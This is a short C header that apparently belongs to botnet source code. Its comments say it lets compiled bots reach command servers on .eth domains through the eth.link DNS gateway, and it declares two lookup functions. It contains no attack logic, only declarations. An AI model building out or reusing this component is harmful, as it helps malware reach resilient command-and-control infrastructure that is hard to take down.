#pragma once

#include "includes.h"

// ENS resolution using eth.link gateway (DNS-based)
// When compiled with ENS=1, bots can connect to .eth domains
// Example: "jeffreyepstein.eth" gets resolved via eth.link DNS

struct resolv_entries *ens_lookup(char *domain);
void ens_domain_to_dns(char *dst, char *ens_domain);

